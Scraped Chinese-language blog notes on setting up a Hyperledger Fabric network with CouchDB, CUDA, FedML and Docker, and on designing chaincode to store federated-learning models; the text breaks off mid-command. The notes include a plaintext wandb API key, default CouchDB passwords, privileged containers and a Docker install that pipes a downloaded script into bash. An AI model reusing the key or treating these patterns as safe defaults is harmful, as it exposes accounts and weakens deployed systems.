没有找到合适的显卡驱动 使用命令登录校园网1curl --data ./pwd http://10.3.8.211/login pwd用url-encoding编写以下内容12user: '学号'pass: '密码' hosts文件配置123456789101112131410.112.242.228 lab.server210.112.144.78 lab.server110.128.196.184 tt-HP10.128.196.184 orderer.fedfab.com10.128.196.184 peer0.org2.fedfab.com10.112.144.78 peer0.org1.fedfab.com10.112.144.78 peer1.org1.fedfab.com10.112.144.78 peer2.org1.fedfab.com10.128.196.184 fedml.server10.112.144.78 fedml.worker110.112.144.78 fedml.worker210.112.144.78 fedml.worker3 在所有主机，fabric的docker中都配置一遍 fabric多机搭建参考 docker compose文件中去掉其他机器的的volumes，peer，cli，orderer 使用scp传送证书，*.block，打包好的链码等文件 1scp fedfab.tar.gz tt@tt-HP:/home/tt/Desktop/fabric/my-network/nodes/mtemp 需要使用CouchDB org1的service节点下增加 123456789services: couchdb0.org1.fedfab.com: container_name: couchdb0.org1.fedfab.com image: couchdb:3.1 environment: - COUCHDB_USER=admin - COUCHDB_PASSWORD=adminpw ports: - 5984:5984 org2的service节点下增加 123456789services: couchdb0.org2.fedfab.com: container_name: couchdb0.org2.fedfab.com image: couchdb:3.1 environment: - COUCHDB_USER=admin - COUCHDB_PASSWORD=adminpw ports: - 5984:5984 peer的environments下增加 12345- CORE_LEDGER_STATE_STATEDATABASE=CouchDB- CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=couchdb0.org1.fedfab.com:5984 ## org1 peer- CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=couchdb0.org2.fedfab.com:5984 ## org2 peer- CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=admin- CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=adminpw peer的depends_on下增加 12- couchdb0.org1.fedfab.com ## org1 peer- couchdb0.org2.fedfab.com ## org2 peer 不使用networks，使用extra-hosts123456extra_hosts: - &quot;orderer.fedfab.com:10.128.196.184&quot; - &quot;peer0.org1.fedfab.com:10.112.144.78&quot; - &quot;peer1.org1.fedfab.com:10.112.144.78&quot; - &quot;peer2.org1.fedfab.com:10.112.144.78&quot; - &quot;peer0.org2.fedfab.com:10.128.196.184&quot; fedml是否需要？ debug记录调用chaincode失败 chaincode 的container启动时，与对应peer建立tcp连接失败 docker-compose的peer节点上，建立tcp的端口与实际端口的映射","link":"/home/2022/10/22/fedfab/fabric/9.%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"},{"title":"fedml-1.配置＆运行&amp;自定义","text":"官方文档 repo 克隆fedml库1git clone https://github.com/FedML-AI/FedML.git 参阅源码 参考样例，测试环境 FedML/iot/anomaly_detection_for_cybersecurity FedML/python/setup.py wsl - cuda 参考 安装支持wsl的Nvidia驱动 下载地址 下载安装cuda 不要下载最新版11.7，pytorch目前不支持1234sudo apt updatesudo apt install build-essential #安装c++ make等环境wget https://developer.download.nvidia.com/compute/cuda/11.6.2/local_installers/cuda_11.6.2_510.47.03_linux.runsudo bash cuda_11.6.2_510.47.03_linux.run 环境变量 在目录~/.bashrc下 追加123export CUDA_HOME=/usr/local/cudaexport PATH=$PATH:$CUDA_HOME/binexport LD_LIBRARY_PATH=/usr/local/cuda-11.7/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}} 生效，并安装需要的库12source ~/.bashrcsudo apt-get install freeglut3-dev build-essential libx11-dev libxmu-dev libxi-dev libgl1-mesa-glx libglu1-mesa libglu1-mesa-dev 检查是否成功1nvcc -V 12345nvcc: NVIDIA (R) Cuda compiler driverCopyright (c) 2005-2022 NVIDIA CorporationBuilt on Tue_May__3_18:49:52_PDT_2022Cuda compilation tools, release 11.7, V11.7.64Build cuda_11.7.r11.7/compiler.31294372_0 安装 cudnn下载安装 参考 123456sudo apt-get install zlib1ghttps://developer.nvidia.com/rdp/cudnn-downloadtar -xvf cudnn-linux-x86_64-8.4.1.50_cuda11.6-archive.tar.xzsudo cp cudnn-*-archive/include/cudnn*.h /usr/local/cuda/includesudo cp -P cudnn-*-archive/lib/libcudnn* /usr/local/cuda/lib64sudo chmod a+r /usr/local/cuda/include/cudnn*.h /usr/local/cuda/lib64/libcudnn* 后来发现这种方式使用cnn时会报错，找不到cudnn cnn的动态链接库，改用以下方法 1conda install -c nvidia cudnn Table 1. Supported NVIDIA Hardware and CUDA Version cuDNN Package Supported NVIDIA Hardware CUDA Toolkit Version CUDA Compute Capability Supports static linking?1 cuDNN 8.4.1 for CUDA 11.x2 NVIDIA Ampere Architecture NVIDIA Turing™ NVIDIA Volta™ NVIDIA Pascal™ NVIDIA Maxwell® NVIDIA Kepler™ 11.7 SM 3.5 and later Yes 11.6 11.5 11.4 11.3 11.2 No 11.1 11.0 cuDNN 8.4.1 for CUDA 10.2 NVIDIA Turing NVIDIA Volta Xavier™ NVIDIA Pascal NVIDIA Maxwell NVIDIA Kepler 10.2 SM 3.0 and later Yes 安装配置fedml 参考-（bilibili视频的方法已经过时） 安装Miniconda12345wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh./Miniconda3-latest-Linux-x86_64.sh## 最后一步选yes，让脚本自动配置环境变量## 根据输出的内容决定下面source的文件source /root/.bashrc 添加Miniconda源123456conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forgeconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/conda config --set show_channel_urls yes #设置搜索时显示通道地址 安装fedml1234conda create --name fedml python=3.7conda activate fedmlconda install --name fedml pippip install fedml -i https://pypi.douban.com/simple 备忘123456常用pip源：豆瓣：https://pypi.douban.com/simple阿里：https://mirrors.aliyun.com/pypi/simple中国科技大学 ：https://pypi.mirrors.ustc.edu.cn/simple/清华大学： https://pypi.tuna.tsinghua.edu.cn/simple/中国科学技术大学 ：https://pypi.mirrors.ustc.edu.cn/simple/ python包：wasabi-控制台打印和格式化工具包 安装fedml环境 进入FEDML仓库，FedML/python，运行setup.py pytorch安装地址，根据cuda版本选择命令，去掉 -c forge（不从官网下载）1python3 setup.py install 卸载pytorch，重新按照cuda版本进行安装 12conda uninstall *torch* cudatoolkitconda install pytorch torchvision torchaudio cudatoolkit=11.6 运行demoiot 运行iot物联网demo server12conda activate fedmlbash run_server.sh client-112conda activate fedmlbash run_client.sh 1 client-212conda activate fedmlbash run_client.sh 2 后来发现这个demo适用于树莓派、Jeston Nano设备，需要进行一定的配置 这个样例中有自定义data loader和trainer，比较有参考价值 mpi_torch_fedopt_mnist_lr_example 配置文件中，以simulation模式运行的 位置，以simulation模式运行，单进程 1bash run_step_by_step_example.sh 2 参数为2时可以完成训练，参数（即worker）过大，会出现以下提示，怀疑是内存不够12345678910==================================================================================== BAD TERMINATION OF ONE OF YOUR APPLICATION PROCESSES= PID 5218 RUNNING AT tt= EXIT CODE: 9= CLEANING UP REMAINING PROCESSES= YOU CAN IGNORE THE BELOW CLEANUP MESSAGES===================================================================================YOUR APPLICATION TERMINATED WITH THE EXIT STRING: Killed (signal 9)This typically refers to a problem with your application.Please see the FAQ page for debugging suggestions 训练完成后会在目录./tmp/下生成一个模型文件fedml，执行cat1cat fedml 输出为12training is finished!&lt;fedml.arguments.Arguments object at 0x7ff03c13b210&gt; 使用GPU进行训练修改配置文件 修改config/fedml_config.yaml文件device_args标签下的内容12345device_args: worker_num: 3 using_gpu: true gpu_mapping_file: config/gpu_mapping.yaml #mapping文件位置 gpu_mapping_key: mapping_tt #使用的mapping 修改mapping文件 在文件config/gpu_mapping.yaml下增加节点mapping_tt 12mapping_tt: tt: [4] #只有一个节点tt，一个gpu 增加节点的格式如下，为每个hostname指定在每个gpu下有多少进程 12345## config_cluster0:## host_name_node0: [num_of_processes_on_GPU0, num_of_processes_on_GPU1, num_of_processes_on_GPU2, num_of_processes_on_GPU3, ..., num_of_processes_on_GPU_n]## host_name_node1: [num_of_processes_on_GPU0, num_of_processes_on_GPU1, num_of_processes_on_GPU2, num_of_processes_on_GPU3, ..., num_of_processes_on_GPU_n]## ......## host_name_node_m: [num_of_processes_on_GPU0, num_of_processes_on_GPU1, num_of_processes_on_GPU2, num_of_processes_on_GPU3, ..., num_of_processes_on_GPU_n] 运行，前面配置了4个进程，worker_num配置为3，这里参数就写3， 3个worker + 1个server 1bash run_step_by_step_example.sh 3 过程中在bash中看到输出 12[FedML-Server(0) @device-id-0] [Thu, 28 Jul 2022 20:54:06] [INFO] [gpu_mapping_mpi.py:51:mapping_processes_to_gpu_device_from_yaml_file_mpi] process_id = 2, GPU device = cuda:0[FedML-Server(0) @device-id-0] [Thu, 28 Jul 2022 20:54:06] [INFO] [device.py:78:get_device] device = cuda:0 taskmgr中查看独显占用情况 说明确实使用了gpu cross_silo 运行 非单进程模拟，多个设备运行 config/fedml_config.yaml 配置节点comm_args123comm_args: backend: &quot;GRPC&quot; grpc_ipconfig_path: config/grpc_ipconfig.csv grpc_ipconfig.csv 安装pip install grpcio，使用grpc协议进行通信 在/config下创建该文件，写入编号-ip，0为server，1...n为worker receiver_id ip 0 127.0.0.1 1 127.0.0.1 2 127.0.0.1 结果 没有找到输出的模型文件，只在最后一轮结束后找到了以下输出123[FedML-Server(0) @device-id-0] [Fri, 29 Jul 2022 22:54:08] [INFO] [fedml_aggregator.py:195:test_on_server_for_all_clients] ################test_on_server_for_all_clients : 49[FedML-Server(0) @device-id-0] [Fri, 29 Jul 2022 22:54:12] [INFO] [fedml_aggregator.py:225:test_on_server_for_all_clients] {'training_acc': 0.796526336274001, 'training_loss': 1.8660167525693983}[FedML-Server(0) @device-id-0] [Fri, 29 Jul 2022 22:54:13] [INFO] [fedml_aggregator.py:257:test_on_server_for_all_clients] {'test_acc': 0.8005698005698005, 'test_loss': 1.8635211240936371} fedml自定义fedml运行参数 fedml运行时需要几个参数 参数 含义 可选值 –cf 配置文件 / –rank 序号，server为0 0,1,2,3 –role server 或 client server, client fedml运行流程1234567891011121314args = fedml.init()## init devicedevice = fedml.device.get_device(args)## load datadataset, output_dim = fedml.data.load(args)## load modelmodel = fedml.model.create(args, output_dim)## start trainingfedml_runner = FedMLRunner(args, device, dataset, model)fedml_runner.run() DataLoader, Model, Trainer都是可以自定义的 参考 DataLoader的自定义 支持MNN，pytorch的DataLoader 输出数据集和输出的维数 模型的自定义 支持pytorch的神经网络模型，torch.nn Trainer的自定义1234567891011121314151617181920from fedml.core import ClientTrainerclass MyModelTrainer(ClientTrainer): #继承ClientTrainer def get_model_params(self): return self.model.cpu().state_dict() def set_model_params(self, model_parameters): self.model.load_state_dict(model_parameters) def train(self, train_data, device, args): #实现模型的训练 pass def test(self, test_data, device, args): pass def test_on_the_server( self, train_data_local_dict, test_data_local_dict, device, args=None ) -&gt; bool: #实现对模型的评估 return True 用qemu虚拟机模拟多台机器（未完成）安装 参考连接 Ninja的安装1sudo apt install ninja-build pkg-config1 12345wget https://download.qemu.org/qemu-7.1.0-rc0.tar.xztar xvJf qemu-7.1.0-rc0.tar.xzcd qemu-7.1.0-rc0./configuremake 使用虚拟机环境，需要对qemu配置显卡直通","link":"/home/2022/10/22/fedfab/fedml/1.%E9%85%8D%E7%BD%AE%EF%BC%86%E8%BF%90%E8%A1%8C&%E8%87%AA%E5%AE%9A%E4%B9%89/"},{"title":"fedml-2.Docker多容器配置","text":"Docker安装1curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 中间遇到输出，提示建议使用for windows12WSL DETECTED: We recommend using Docker Desktop for Windows.Please get Docker Desktop from https://www.docker.com/products/docker-desktop 创建容器并配置环境验证是否可以使用gpu 官方参考1docker run --gpus all nvcr.io/nvidia/k8s/cuda-sample:nbody nbody -gpu -benchmark pull fedml镜像1docker pull fedml/fedml:cuda-11.4.0-devel-ubuntu20.04 编写运行脚本并运行1234567891011121314151617181920212223FEDML_DOCKER_IMAGE=fedml/fedml:cuda-11.4.0-devel-ubuntu20.04WORKSPACE=~/Desktop/docker_workspaceFEDML_REPO=~/Desktop/FedMLDATA=~/fedml_dataID=$1IP=$2NUM=$3HOSTNAME=$4sudo docker run -itd -v $WORKSPACE:/home/workspace -v $FEDML_REPO:/home/fedml_repo -v $DATA:/root/fedml_data \\--shm-size=64g --ulimit nofile=65535 --ulimit memlock=-1 --privileged \\--env FEDML_NODE_INDEX=$ID \\--env WORKSPACE=$WORKSPACE \\--env FEDML_NUM_NODES=$NUM \\--env FEDML_MAIN_NODE_INDEX=0 \\--env FEDML_RUN_ID=$ID \\--env FEDML_MAIN_NODE_PRIVATE_IPV4_ADDRESS=$IP \\--gpus all \\--hostname $HOSTNAME \\-u fedml --net=host \\$FEDML_DOCKER_IMAGE \\/bin/bash 创建两个容器12bash run_fedml_docker.sh 1 2 127.0.0.1 worker1bash run_fedml_docker.sh 2 2 127.0.0.1 worker2 修改GPU MAPPING1234mapping_default: tt: [1] worker1: [1] worker2: [1] 初始化fedml 分别在两个docker内运行1sudo /home/code/setup_docker.sh 更新fedml 自带的pytorch支持的gpu算力等级太低，需要更新 在主节点下启动server1bash run_server.sh 在容器中启动client12bash run_client.sh 1bash run_client.sh 2 可以正常运行，也可以正常调用gpu 使用Dockerfile避免setup_docker.sh 节省空间 避免重复下载环境 新建一个空目录，在其中创建文件Dockerfile1234FROM fedml/fedml:cuda-11.4.0-devel-ubuntu20.04RUN python -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --upgrade pipRUN pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simpleRUN pip3 install --upgrade fedml 对于算力较高的gpu，更新pytorch 12345678FROM fedml/fedml:cuda-11.4.0-devel-ubuntu20.04RUN python -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --upgrade pipRUN pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simpleRUN pip3 install --upgrade fedmlRUN pip3 uninstall -y torchRUN pip3 uninstall -y torchaudioRUN pip3 uninstall -y torchvisionRUN pip3 install torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/cu116 #3050TI 在该目录下执行1sudo docker build -t fedml:tt . 使用fedml:tt创建container1234567891011121314151617181920212223FEDML_DOCKER_IMAGE=fedml:tt ### 这里WORKSPACE=~/Desktop/docker_workspaceFEDML_REPO=~/Desktop/FedMLDATA=~/fedml_dataID=$1IP=$2NUM=$3HOSTNAME=$4sudo docker run -itd -v $WORKSPACE:/home/workspace -v $FEDML_REPO:/home/fedml_repo -v $DATA:/root/fedml_data \\--shm-size=64g --ulimit nofile=65535 --ulimit memlock=-1 --privileged \\--env FEDML_NODE_INDEX=$ID \\--env WORKSPACE=$WORKSPACE \\--env FEDML_NUM_NODES=$NUM \\--env FEDML_MAIN_NODE_INDEX=0 \\--env FEDML_RUN_ID=$ID \\--env FEDML_MAIN_NODE_PRIVATE_IPV4_ADDRESS=$IP \\--gpus all \\--hostname $HOSTNAME \\-u fedml --net=host \\$FEDML_DOCKER_IMAGE \\/bin/bash 容器创建脚本 创建容器并开始观测gpu使用率123456789sudo docker stop $(sudo docker ps -a | awk '{ print $1}' | tail -n +2)sudo docker container pruneread -n1 -p &quot;Press any key to create containers...&quot;./run_fedml_docker.sh 0 127.0.0.1 3 server./run_fedml_docker.sh 1 127.0.0.1 3 worker1./run_fedml_docker.sh 2 127.0.0.1 3 worker2docker ps -aread -n1 -p &quot;Press any key to continue...&quot;watch -n 1 nvidia-smi","link":"/home/2022/10/22/fedfab/fedml/2.Docker%E5%A4%9A%E5%AE%B9%E5%99%A8%E9%85%8D%E7%BD%AE/"},{"title":"fedml-3.Runner源码阅读","text":"wandb 的使用 在wandb官网project页面创建工程 获取wandb_key 配置config.yaml enable - true wandb key priject name123456tracking_args: log_file_dir: ./log enable_wandb: true #enable wandb_key: e3be1b9a8ab45f14a6ff454009bc7ca07b8792ba #key wandb_project: fedml_mnist_test #project name wandb_name: fedml_torch_fedavg_mnist_lr 运行 运行时选择2，将key再输入一次1234567wandb: (1) Create a W&amp;B accountwandb: (2) Use an existing W&amp;B accountwandb: (3) Dont visualize my resultswandb: Enter your choice: 2wandb: You chose 'Use an existing W&amp;B account'wandb: You can find your API key in your browser here: https://wandb.ai/authorizewandb: Paste an API key from your profile and hit enter, or press ctrl+c to quit: wandb结果 在终端输出了1234567891011121314151617181920212223242526272829303132333435363738394041424344wandb: Waiting for W&amp;B process to finish... (success).wandb: wandb: wandb: Run history:wandb: AggregationTime ▂▃▃▂▂▃▃▃▃▂▃▃▁▃▃▂▃▇▃▃▃▇▂▃▃▂▃▃█▃▂▂▂▃▃▃▃▁▂▂wandb: BenchmarkStart ▁wandb: BusyTime ▁▄▄▄▄▃▅▃▂▄▆▃▃▇▄▃▅█▃▆▄▅▅▅▃▂▄▅▄▃▄▃▄▄▃▂▄▃▃█wandb: Comm/recieve_delay_s3 ▃▁▂▁▂▂▁▂▂▂▁▂▂▁▃▄▂▄▂▂▁█▂▂▂▂▄▂▁▂▂▂▃▂▃▁▁▂▂▃wandb: Comm/send_delay █▃▂▁▁▁▃▂▂▁▂▆▁▄▂▃▅▂▂▂▂▁▁▁▂▁▁▁▁▁▁▃▁▁▂▂▁▁▂▁wandb: Comm/send_delay_mqtt ▃▆▆▇▆▆▇▆▆▆▆▆▆▆▂▆▆▆▆▆▆▆▆▁█▆▆▆▆▆▁▆▆▁▁▆▆▆█▁wandb: Communiaction/Send_Total █▃▂▁▁▁▃▂▂▁▂▆▁▄▂▃▅▂▂▂▂▁▁▁▂▁▁▁▁▁▁▃▁▁▂▂▁▁▂▁wandb: ListenStart ▁wandb: MessageReceiveTime ▁▁▂▂▂▂▂▂▂▂▂▂▄▄▄▄▄▄▄▄▅▅▅▅▅▅▅▅▇▇▇▇▇▇▇▇▇▇██wandb: PickleDumpsTime █▁▅▁▁▁▂▆▃▅▂▃▅▁▁▁▅▁▆▅▁▁▅▅▁▄▅▅▁▅▅▅▁▁▅▅▅▂▅▁wandb: Test/Acc ▁▄▄▅▆▆▆████wandb: Test/Loss █▆▅▃▃▂▂▁▁▁▁wandb: TotalTime ▁wandb: Train/Acc ▁▄▄▅▆▆▆████wandb: Train/Loss █▆▅▄▃▂▂▁▁▁▁wandb: UnpickleTime █▄▄▃█▄▄▄▄▄▇▇▄▇▄▁▄▇▄▁▄▇▇▄▇▂▄▇▄▄▄▄▄▄▇▄▄▂▁▄wandb: round ▁▁▁▁▂▂▂▂▂▂▃▃▃▃▃▄▄▄▄▅▅▅▅▅▅▅▆▆▆▆▇▇▇▇▇▇▇███wandb: wandb: Run summary:wandb: AggregationTime 0.00103wandb: BenchmarkStart 1660014268.494wandb: BusyTime 8.49421wandb: Comm/recieve_delay_s3 3.13148wandb: Comm/send_delay 0.40766wandb: Comm/send_delay_mqtt 4e-05wandb: Communiaction/Send_Total 0.40971wandb: ListenStart 1660014198.82541wandb: MessageReceiveTime 1660014798.21999wandb: PickleDumpsTime 0.00032wandb: Test/Acc 0.80057wandb: Test/Loss 1.86352wandb: TotalTime 607.89401wandb: Train/Acc 0.79653wandb: Train/Loss 1.86602wandb: UnpickleTime 0.00087wandb: round 49wandb: wandb: Synced exalted-eon-1: https://wandb.ai/tt_blockchain/fedml_mnist_test/runs/3850zs40wandb: Synced 5 W&amp;B file(s), 0 media file(s), 0 artifact file(s) and 0 other file(s)wandb: Find logs at: ./wandb/run-20220809_030244-3850zs40/logs 在网页中输出情况report.pdf FedMLRunner 该Runner是通用的runner 根据args.training_type进行初始化 simulation cross silo cross device _init_simulation_runner 根据args中的backend构造runner SP -&gt; SimulatorSingleProcess MPI -&gt; SimulatorMPI NCCL -&gt; SimulatorNCCL _init_cross_silo_runner 根据args.role为 clientorserver构造runner client -&gt; Client server -&gt; Sever _init_cross_device_runner args.role 为 sever，构造ServerMNN，否则raise Exception Sever FedMLCrossSiloServer 若federated_optimizer为FedAvg，trainer = server_initializer.init_server 若federated_optimizer为LSA，trainer=FedML_LSA_Horizontal server_initializer.init_server 创建Aggregator - 聚集器，处理训练相关的任务，将Client的模型聚集并更新全局模型 创建FedMLServerManager - 收发网络请求 FedML_LSA_Horizontal 根据client rank init server或client init server会创建Aggregator和ServerManager init client会创建Trainer和ClientManager，一般role为server，rank也是0，这一步应该不会走到 Client FedMLCrossSiloClient 若federated_optimizer为FedAvg，trainer = client_initializer.init_client 若federated_optimizer为LSA，trainer=FedML_LSA_Horizontal Aggregator FedMLAggregator 通过cross silo找到的 还有FedSegAggregator、BaseLocalAggregator、RobustAggregator等 函数 add_local_trained_result和check_whether_all_receive add_local_trained_result负责记录local的训练结果 check_whether_all_receive负责检查是否全部上传本地模型，若是，则将全部flag置为False aggregate 计算出总的训练样本数目（所有client训练的样本数之和） 根据本地样本数/总训练数计算权值w 根据权值算出模型参数的加权平均 更新全局模型 data_silo_selection 若每轮训练数和总client数相同，则返回0...n-1，否则随机从中随机寻找一部分 client_selection 也是一个随机选择，和上一个差不多 client_sampling 看起来和data_silo_selection一模一样 test_on_server_for_all_clients if self.trainer.test_on_the_server : return 每隔n轮一次test 或 最后一轮时进行test(对训练集) 对于每一个client，计算TP+TN，训练个数，loss，并保存 计算总的acc和loss，打log，若启用了wandb，则使用wandb api记录 对测试集进行测试，log，wandb记录 FedMLServerManager父类 ServerManager函数 __init__ 根据backend具体指定的协议名称构造对应的CommunicationManager run 执行register_message_receive_handlers（子类实现），用于注册子类定义的几种消息和消息对应的callback函数，当收到对应消息类型时调用相应函数 执行具体协议对应的CommunicationManager的handle_receive_message receive_message 参数，msg_type，msg_params 从一个字典中根据msgType获取callback，并调用，传递msg_params send_message 通过CommunicationManager发送 register_message_receive_handler 维护message_handler_dict，即前面提到的callback字典 注册新的msg_type和他的callback finish 将CommunicationManager stop掉 FedMLServerManager的函数 run super().run() send_init_msg 发送初始化信息 对于本轮中的每一个参与的client，发送初始模型参数，通过函数send_message_init_config send_message_init_config通过父类的send_message实现 register_message_receive_handlers 注册三类信息的处理函数，通过父类的register_message_receive_handler实现 client的connection ready client的status change 当所有的client都online，调用send_init_msg client的model发送 通过Aggregator的add_local_trained_result将参数中的模型参数，训练样本数等信息聚集起来 如果全部发送了模型信息 调用Aggregator的aggregate函数更新全局模型，test_on_server_for_all_clients函数进行模型的测试。 进行下一轮训练，全局模型发送至下一轮的机器中，通过send_message_sync_model_to_client函数 轮数+=1，若轮数达到预定的总轮数，调用cleanup函数 cleanup 向所有client发送finis信息 延迟3s，调用finish结束自己（父类的finish） 三个handle_* register_message_receive_handlers中注册的三个函数，用于处理客户端的消息 几个send_* 在前面都有提到，向客户端发送信息 FedMLCrossSiloClient 如果args.scenario HIERARCHICAL，则根据rank，若rank为0，构造ClientMasterManager，否则构造ClientSlaveManager HORIZONTAL，构造ClientMasterManager Master客户端的父类–ClientManager 与ServerManager类似，根据协议构造CommunicationManager，提供消息类型与回调的注册函数，提供send_message函数 不同点在于Server的Host和Port固定，Client从配置中读取 ClientMasterManager 和ServerManager类似，处理网络消息，给server发送信息（如本地模型信息等） 训练本地模型 ClientSlaveManager 处理本地训练 Observer 定义抽象函数receive_message，communicationManager会调用observer的这个函数，将受到的消息类型，参数传递给子类，上面的例子中都是使用消息类型-handle函数的dict实现对不同类型的消息进行处理 结论 根据FedML+BlockChain的定义双方之间的通信流程，根据通信流程分别置顶S-C的通信消息，直接基于ClientManager和ServerManager，自定义一个FedMLBlockChainServer和FedMLBlockChainServer，实现这个通信过程。","link":"/home/2022/10/22/fedfab/fedml/3.Runner%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"},{"title":"fedml-4.与fabric通信","text":"直接采用“偷梁换柱”的模式,把修改后的代码复制到pip安装的位置 pip install的位置通过python -m site命令查找包的安装路径 123456789101112sys.path = [ '/usr/share/python3', '/usr/lib/python310.zip', '/usr/lib/python3.10', '/usr/lib/python3.10/lib-dynload', '/home/tt/.local/lib/python3.10/site-packages', '/usr/local/lib/python3.10/dist-packages', '/usr/lib/python3/dist-packages',]USER_BASE: '/home/tt/.local' (exists)USER_SITE: '/home/tt/.local/lib/python3.10/site-packages' (exists)ENABLE_USER_SITE: True 思考：需要修改哪些代码？ 修改Aggregator。Aggregator的作用是（1）保存各个节点上传的本地模型；（2）对本地模型进行aggregate操作。 分离aggregator的功能,分为本地Aggregator和链上Aggregator,本地Aggregator不保存模型,将收到的模型转发给区块链,聚集操作时先向区块链取模型,再进行聚集操作 修改FedMLServerManager 在适当位置调用http接口,适当根据逻辑需要修改其它代码 修改ClientMasterManager 在适当位置调用http接口,适当根据逻辑需要修改其它代码 修改message_define,文件中定义了C/S之间相互通信的名称,参数名称 对其适当增删,达到C/S间协同的目的 修改FedMLAggregator model_dict: 用于保存收到的本地模型,与他相关的sample_num_dict,保存收到的本地模型的样本个数,flag_client_model_uploaded_dict用于保存是否收到模型。区块链端的Aggregator需要维护这三个数组 add_local_trained_result,这个函数通过ml_engine_adapter.model_params_to_device获得本地模型,将这个函数注释掉 check_whether_all_receive,这个函数通过检查flag_client_model_uploaded_dict是否全是true来判断是否全部收到。这里改成从区块链获取 aggregate,这个函数使用了sample_num_dict和model_dict,也全都改成从区块链获取 其他函数未涉及这三个dict,暂不做修改。 修改FedMLServerManager handle_message_receive_model_from_client,这个函数处理节点发送来的模型,从消息中读取模型参数和样本个数。不从消息中获取这两个参数（后续修改Client,也不发送这两个参数）,但是仍然向Server发送这个消息。收到消息后延迟一定时间向区块链查询是否全部收到（调用本地aggregator的check_whether_all_receive） 当查询到全部都收到后,会进行聚集操作,聚集操作后产生更新后的模型,这个模型会发送给client,在发送给client的同时发送一份给区块链存储 修改ClientMasterManager send_model_to_server,对应Server的handle_message_receive_model_from_client。不发送模型和样本数给server,而是发送给区块链 统一发送模型的格式 ml_engine_adapter中的函数model_params_to_device用于处理收到的模型,根据ml_engine的类型对模型进行处理,希望在发送之前在Client端就进行处理 通过测试,输出type(ml_engine_adapter.model_params_to_device(self.args, weights, self.trainer_dist_adapter.device)),得到其类型是collections.OrderedDict它也是一种dict, 存储的是model_params(string) to Tensor对他进行处理,变成python原生的dict,对Tensor处理,变成python原生的list,目的是使其可以变成json串server收到后,对其dumps, 再将list转换成Tensor 1234567from ...ml.engine import ml_engine_adaptermodel_params = ml_engine_adapter.model_params_to_device(self.args, weights, self.trainer_dist_adapter.device)model_params = {k:v.tolist() for k,v in model_params.items()}logging.info(&quot;Jingtian: type of model_params: %s&quot; % type(model_params))import jsonmodel_params_json = json.dumps(model_params)logging.info(&quot;Jingtian: model_params: &quot; + (model_params_json)) 编写ChainCode链上Aggregator实现思路ChainCode要实现存储模型,并检测每轮模型是否上传完毕,参考fabcar示例中队Car的定义以及对Car的增改查的代码,设计Round结构 12345type Round struct { Models map[string]string // ClientID to Model RoundID string ClientNum int64} 只需要检查Round中len(Model)与ClientNum是否相等即可 ChainCode合约定义根据上面的分析,需要一下几个函数 AddModel 接受并存储本地模型 保存： model-key model-weight model-sample-num params: RoundID string ClientID string model string(原始json串) QueryWetherAllReceived 检查是否全部收到,检查是否全部收到,返回True or False params: RoundID string QueryAllReceived 若全部收到,返回模型,模型权重和模型样本数目,否则返回空 params: RoundID string UpdateGlobal 接受Server聚集后的,更新后的模型,对区块链内的内容进行更新 params: ServerID string model-weight string NewRound 新增一个Round,每轮开始时创建 params: RoundID string ClientNum int64 根据以上分析,需要在fedml节点运行时生成一个id,server的id自然成为server-id,client的id自然成为ClientID。在每轮训练开始前,需要生成RoundID,并且调用NewRound通知区块链。RoundID的前n为与ServerID相同,再拼接随机生成的后n位。 通过以下命令进行对ChainCode的测试与Debug123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960## RoundID = &quot;ri&quot;## ServerID = &quot;si&quot;## ClientID = &quot;ci&quot;peer chaincode invoke -o orderer.fedfab.com:7050 --isInit --ordererTLSHostnameOverride orderer.fedfab.com --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer1.org1.fedfab.com:8053 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer1.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer2.org1.fedfab.com:8055 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer2.org1.fedfab.com/tls/ca.crt \\ --peerAddresses peer0.org2.fedfab.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.fedfab.com/peers/peer0.org2.fedfab.com/tls/ca.crt \\ -c '{&quot;Args&quot;:[&quot;initialize&quot;, &quot;Initializing chaincode&quot;]}'## chaincode 初始化peer chaincode invoke -o orderer.fedfab.com:7050 --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/fedfab.com/orderers/orderer.fedfab.com/msp/tlscacerts/tlsca.fedfab.com-cert.pem --channelID channel2 --name fedfab --tls true \\ --peerAddresses peer0.org1.fedfab.com:8051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.fedfab.com/peers/peer0.org1.fedfab.com/tls/ca.crt \\ --peerAddresses 